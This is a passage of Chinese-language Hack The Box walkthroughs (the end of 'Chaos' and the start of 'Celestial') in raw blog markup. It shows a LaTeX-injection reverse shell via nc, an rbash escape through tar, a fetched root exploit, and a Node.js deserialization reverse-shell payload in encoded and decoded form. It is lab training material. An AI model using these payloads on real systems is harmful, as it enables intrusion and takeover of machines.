class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/tree/m</span>aster/LaTeX%<span class="hljs-number">20</span>Injection<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>chaos.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>170<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://chaos.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/<br><br><span class="language-apache"><span class="hljs-attribute">content</span>=\immediate\write18&#123;rm%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ff%<span class="hljs-number">3</span>Bmkfifo%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ff%<span class="hljs-number">3</span>Bcat%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ff%<span class="hljs-number">7</span>Csh%<span class="hljs-number">20</span>-i%<span class="hljs-number">202</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>%<span class="hljs-number">7</span>Cnc%<span class="hljs-number">2010</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">3</span>%<span class="hljs-number">201337</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ff &gt; output&#125;&amp;template=test2</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.120] 36120<br>sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ </span><br><span class="hljs-string">id</span><br></code></pre></td></tr></table></figure><p>接收不成功。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>chaos.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>170<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://chaos.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/<br><br><span class="language-awk">content=%<span class="hljs-number">5</span>Cimmediate%<span class="hljs-number">5</span>Cwrite18%<span class="hljs-number">7</span>Brm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;%<span class="hljs-number">261</span>|nc <span class="hljs-number">10.10</span>.<span class="hljs-number">16.3</span> <span class="hljs-number">1337</span> &gt;<span class="hljs-regexp">/tmp/</span>f%<span class="hljs-number">7</span>D&amp;template=test3</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.120] 36132<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ script -qc /bin/bash /dev/null</span><br><span class="hljs-string">www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ </span><br></code></pre></td></tr></table></figure><p>之前的凭证可以直接用，但是命令执行不了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@chaos:/home$ <span class="hljs-built_in">ls</span><br>ayush  sahay<br>www-data@chaos:/home$ su ayush<br>Password: <br>ayush@chaos:/home$ <span class="hljs-built_in">ls</span><br>rbash: /usr/lib/command-not-found: restricted: cannot specify `/<span class="hljs-string">&#x27; in command names</span><br><span class="hljs-string">ayush@chaos:/home$ cd ~   </span><br><span class="hljs-string">rbash: cd: restricted</span><br><span class="hljs-string">ayush@chaos:/home$ ifconfig</span><br><span class="hljs-string">rbash: /usr/lib/command-not-found: restricted: cannot specify `/&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">command</span> names<br>ayush@chaos:/home$ <br></code></pre></td></tr></table></figure><p>处于一个受限的shell中，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">/home/ayush/.app<br>&lt;l --checkpoint=1 --checkpoint-action=<span class="hljs-built_in">exec</span>=/bin/bash<br>tar: Removing leading `/<span class="hljs-string">&#x27; from member names</span><br><span class="hljs-string">bash: groups: command not found</span><br><span class="hljs-string">&lt;l --checkpoint=1 --checkpoint-action=exec=/bin/bash</span><br><span class="hljs-string">tar: Removing leading `/&#x27;</span> from member names<br>bash: <span class="hljs-built_in">groups</span>: <span class="hljs-built_in">command</span> not found<br>&lt;l/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>ayush@chaos:/home$ <span class="hljs-built_in">ls</span><br>ayush  sahay<br>ayush@chaos:/home$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=<span class="hljs-built_in">exec</span>=/bin/bash<br><span class="hljs-built_in">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">ayush@chaos:~$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/bin/chfn<br>/usr/bin/traceroute6.iputils<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/usr/bin/at<br>/usr/bin/newgrp<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/gpasswd<br>/bin/ntfs-3g<br>/bin/su<br>/bin/umount<br>/bin/fusermount<br>/bin/ping<br>/bin/mount<br>ayush@chaos:~$ <span class="hljs-built_in">uname</span> -a<br>Linux chaos 4.18.0-12-generic <span class="hljs-comment">#13-Ubuntu SMP Wed Nov 14 15:17:05 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br>ayush@chaos:~$ wget http://10.10.16.3.pwk.py<br>--2022-08-22 12:30:40--  http://10.10.16.3.pwk.py/<br>Resolving 10.10.16.3.pwk.py (10.10.16.3.pwk.py)... failed: Temporary failure <span class="hljs-keyword">in</span> name resolution.<br>wget: unable to resolve host address ‘10.10.16.3.pwk.py’<br>ayush@chaos:~$ wget http://10.10.16.3/pwk.py<br>--2022-08-22 12:30:47--  http://10.10.16.3/pwk.py<br>Connecting to 10.10.16.3:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: ‘pwk.py’<br><br>pwk.py              100%[===================&gt;]   3.37K  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2022-08-22 12:30:48 (8.82 MB/s) - ‘pwk.py’ saved [3448/3448]<br><br>ayush@chaos:~$ <span class="hljs-built_in">ls</span><br>mail  pwk.py  user.txt<br>ayush@chaos:~$ python pwk.py <br>  File <span class="hljs-string">&quot;pwk.py&quot;</span>, line 43<br>    cargv = (c_char_p * (len(argv) + 1))(*argv, None)<br>SyntaxError: only named arguments may follow *expression<br>ayush@chaos:~$ python3 pwk.py <br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1001(ayush)<br><span class="hljs-comment"># cat /root/root.txt</span><br>a837.................................<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Celestial</title>
    <link href="/post/HackTheBox-Celestial.html"/>
    <url>/post/HackTheBox-Celestial.html</url>
    
    <content type="html"><![CDATA[<p>目标IP为10.10.10.85。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- -Pn -sV -sC -T4 10.10.10.85<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.85<br>Host is up (0.27s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br>3000/tcp open  http    Node.js Express framework<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=utf-8).</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132026752.png" alt="image-20220408132026752"  /><p>反序列化注入，那就找反序列化注入点吧，看起来像是在Cookie字段：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132319093.png" alt="image-20220408132319093"  /><p>可以先对其进行URL解码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==<br></code></pre></td></tr></table></figure><p>再对其进行Base64解码，这便是Cookie字段中的信息了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-string">&quot;Idk Probably Somewhere Dumb&quot;</span>,<span class="hljs-string">&quot;city&quot;</span>:<span class="hljs-string">&quot;Lametown&quot;</span>,<span class="hljs-string">&quot;num&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>哦我看到一个num：2，页面中也是有2这个数字的，要不我改改试试：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132800103.png" alt="image-20220408132800103"  /><p>好吧，它变成了3。Nmap为我枚举出了目标是Nodejs脚本语言环境，那我便可搜索Nodejs deserialization bug 。我找到了这个文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>opsecx.com<span class="hljs-regexp">/index.php/</span><span class="hljs-number">2017</span><span class="hljs-regexp">/02/</span><span class="hljs-number">08</span><span class="hljs-regexp">/exploiting-node-js-deserialization-bug-for-remote-code-execution/</span><br></code></pre></td></tr></table></figure><p>该序列化产生的漏洞原理就像文章作者的演示：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408141154804.png" alt="image-20220408141154804"  /><p>它为我介绍了Nodejs语言反序列化利用细节，并为我推荐了一个Nodejs反序列化漏洞利用脚本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ajinabraham/</span>Node.Js-Security-Course<span class="hljs-regexp">/blob/m</span>aster/nodejsshell.py<br></code></pre></td></tr></table></figure><p>该脚本可以为我生成建立反向shell的载荷，用法也很简单：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> nodejsshell.py <span class="hljs-number">10.10.16.3</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">[+] LHOST = <span class="hljs-number">10.10.16.3</span><br>[+] LPORT = <span class="hljs-number">4444</span><br>[+] Encoding<br>eval(String.fromCharCode(<span class="hljs-number">10,118,97,114</span>,<span class="hljs-number">32,110,101,116</span>,<span class="hljs-number">32,61,32,114</span>,<span class="hljs-number">101,113,117,105</span>,<span class="hljs-number">114,101,40,39</span>,<span class="hljs-number">110,101,116,39</span>,<span class="hljs-number">41,59,10,118</span>,<span class="hljs-number">97,114,32,115</span>,<span class="hljs-number">112,97,119,110</span>,<span class="hljs-number">32,61,32,114</span>,<span class="hljs-number">101,113,117,105</span>,<span class="hljs-number">114,101,40,39</span>,<span class="hljs-number">99,104,105,108</span>,<span class="hljs-number">100,95,112,114</span>,<span class="hljs-number">111,99,101,115</span>,<span class="hljs-number">115,39,41,46</span>,<span class="hljs-number">115,112,97,119</span>,<span class="hljs-number">110,59,10,72</span>,<span class="hljs-number">79,83,84,61</span>,<span class="hljs-number">34,49,48,46</span>,<span class="hljs-number">49,48,46,49</span>,<span class="hljs-number">54,46,51,34</span>,<span class="hljs-number">59,10,80,79</span>,<span class="hljs-number">82,84,61,34</span>,<span class="hljs-number">52,52,52,52</span>,<span class="hljs-number">34,59,10,84</span>,<span class="hljs-number">73,77,69,79</span>,<span class="hljs-number">85,84,61,34</span>,<span class="hljs-number">53,48,48,48</span>,<span class="hljs-number">34,59,10,105</span>,<span class="hljs-number">102,32,40,116</span>,<span class="hljs-number">121,112,101,111</span>,<span class="hljs-number">102,32,83,116</span>,<span class="hljs-number">114,105,110,103</span>,<span class="hljs-number">46,112,114,111</span>,<span class="hljs-number">116,111,116,121</span>,<span class="hljs-number">112,101,46,99</span>,<span class="hljs-number">111,110,116,97</span>,<span class="hljs-number">105,110,115,32</span>,<span class="hljs-number">61,61,61,32</span>,<span class="hljs-number">39,117,110,100</span>,<span class="hljs-number">101,102,105,110</span>,<span class="hljs-number">101,100,39,41</span>,<span class="hljs-number">32,123,32,83</span>,<span class="hljs-number">116,114,105,110</span>,<span class="hljs-number">103,46,112,114</span>,<span class="hljs-number">111,116,111,116</span>,<span class="hljs-number">121,112,101,46</span>,<span class="hljs-number">99,111,110,116</span>,<span class="hljs-number">97,105,110,115</span>,<span class="hljs-number">32,61,32,102</span>,<span class="hljs-number">117,110,99,116</span>,<span class="hljs-number">105,111,110,40</span>,<span class="hljs-number">105,116,41,32</span>,<span class="hljs-number">123,32,114,101</span>,<span class="hljs-number">116,117,114,110</span>,<span class="hljs-number">32,116,104,105</span>,<span class="hljs-number">115,46,105,110</span>,<span class="hljs-number">100,101,120,79</span>,<span class="hljs-number">102,40,105,116</span>,<span class="hljs-number">41,32,33,61</span>,<span class="hljs-number">32,45,49,59</span>,<span class="hljs-number">32,125,59,32</span>,<span class="hljs-number">125,10,102,117</span>,<span class="hljs-number">110,99,116,105</span>,<span class="hljs-number">111,110,32,99</span>,<span class="hljs-number">40,72,79,83</span>,<span class="hljs-number">84,44,80,79</span>,<span class="hljs-number">82,84,41,32</span>,<span class="hljs-number">123,10,32,32</span>,<span class="hljs-number">32,32,118,97</span>,<span class="hljs-number">114,32,99,108</span>,<span class="hljs-number">105,101,110,116</span>,<span class="hljs-number">32,61,32,110</span>,<span class="hljs-number">101,119,32,110</span>,<span class="hljs-number">101,116,46,83</span>,<span class="hljs-number">111,99,107,101</span>,<span class="hljs-number">116,40,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">99,111,110,110</span>,<span class="hljs-number">101,99,116,40</span>,<span class="hljs-number">80,79,82,84</span>,<span class="hljs-number">44,32,72,79</span>,<span class="hljs-number">83,84,44,32</span>,<span class="hljs-number">102,117,110,99</span>,<span class="hljs-number">116,105,111,110</span>,<span class="hljs-number">40,41,32,123</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,118,97,114</span>,<span class="hljs-number">32,115,104,32</span>,<span class="hljs-number">61,32,115,112</span>,<span class="hljs-number">97,119,110,40</span>,<span class="hljs-number">39,47,98,105</span>,<span class="hljs-number">110,47,115,104</span>,<span class="hljs-number">39,44,91,93</span>,<span class="hljs-number">41,59,10,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,46,119,114</span>,<span class="hljs-number">105,116,101,40</span>,<span class="hljs-number">34,67,111,110</span>,<span class="hljs-number">110,101,99,116</span>,<span class="hljs-number">101,100,33,92</span>,<span class="hljs-number">110,34,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">112,105,112,101</span>,<span class="hljs-number">40,115,104,46</span>,<span class="hljs-number">115,116,100,105</span>,<span class="hljs-number">110,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,115</span>,<span class="hljs-number">116,100,111,117</span>,<span class="hljs-number">116,46,112,105</span>,<span class="hljs-number">112,101,40,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,115</span>,<span class="hljs-number">116,100,101,114</span>,<span class="hljs-number">114,46,112,105</span>,<span class="hljs-number">112,101,40,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,111</span>,<span class="hljs-number">110,40,39,101</span>,<span class="hljs-number">120,105,116,39</span>,<span class="hljs-number">44,102,117,110</span>,<span class="hljs-number">99,116,105,111</span>,<span class="hljs-number">110,40,99,111</span>,<span class="hljs-number">100,101,44,115</span>,<span class="hljs-number">105,103,110,97</span>,<span class="hljs-number">108,41,123,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,99,108</span>,<span class="hljs-number">105,101,110,116</span>,<span class="hljs-number">46,101,110,100</span>,<span class="hljs-number">40,34,68,105</span>,<span class="hljs-number">115,99,111,110</span>,<span class="hljs-number">110,101,99,116</span>,<span class="hljs-number">101,100,33,92</span>,<span class="hljs-number">110,34,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">111,110,40,39</span>,<span class="hljs-number">101,114,114,111</span>,<span class="hljs-number">114,39,44,32</span>,<span class="hljs-number">102,117,110,99</span>,<span class="hljs-number">116,105,111,110</span>,<span class="hljs-number">40,101,41,32</span>,<span class="hljs-number">123,10,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,115,101</span>,<span class="hljs-number">116,84,105,109</span>,<span class="hljs-number">101,111,117,116</span>,<span class="hljs-number">40,99,40,72</span>,<span class="hljs-number">79,83,84,44</span>,<span class="hljs-number">80,79,82,84</span>,<span class="hljs-number">41,44,32,84</span>,<span class="hljs-number">73,77,69,79</span>,<span class="hljs-number">85,84,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,125,10,99</span>,<span class="hljs-number">40,72,79,83</span>,<span class="hljs-number">84,44,80,79</span>,<span class="hljs-number">82,84,41,59</span>,<span class="hljs-number">10</span>))<br></code></pre></td></tr></table></figure><p>如果好奇一大串十进制数字是什么意思，我推荐如下网址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.rapidtables.com<span class="hljs-regexp">/convert/</span>number/ascii-hex-bin-dec-converter.html<br></code></pre></td></tr></table></figure><p>将对应的编码类型填入合适的输入框中，它就会为你列出各种编码类型的意思：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408135107129.png" alt="image-20220408135107129"  /><p>而我的载荷代码就是如下这样的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>);<br><span class="hljs-keyword">var</span> spawn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">spawn</span>;<br><span class="hljs-variable constant_">HOST</span>=<span class="hljs-string">&quot;10.10.16.3&quot;</span>;<br><span class="hljs-variable constant_">PORT</span>=<span class="hljs-string">&quot;4444&quot;</span>;<br><span class="hljs-variable constant_">TIMEOUT</span>=<span class="hljs-string">&quot;5000&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">contains</span> === <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123; <span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">contains</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">it</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">indexOf</span>(it) != -<span class="hljs-number">1</span>; &#125;; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">HOST,PORT</span>) &#123;<br>    <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.<span class="hljs-title class_">Socket</span>();<br>    client.<span class="hljs-title function_">connect</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-variable constant_">HOST</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> sh = <span class="hljs-title function_">spawn</span>(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>,[]);<br>        client.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;Connected!\n&quot;</span>);<br>        client.<span class="hljs-title function_">pipe</span>(sh.<span class="hljs-property">stdin</span>);<br>        sh.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">pipe</span>(client);<br>        sh.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">pipe</span>(client);<br>        sh.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;exit&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">code,signal</span>)&#123;<br>          client.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;Disconnected!\n&quot;</span>);<br>        &#125;);<br>    &#125;);<br>    client.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-title function_">c</span>(<span class="hljs-variable constant_">HOST</span>,<span class="hljs-variable constant_">PORT</span>), <span class="hljs-variable constant_">TIMEOUT</span>);<br>    &#125;);<br>&#125;<br><span class="hljs-title function_">c</span>(<span class="hljs-variable constant_">HOST</span>,<span class="hljs-variable constant_">PORT</span>);<br></code></pre></td></tr></table></figure><p>究竟如何利用，文章作者也为我很好的展示了：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 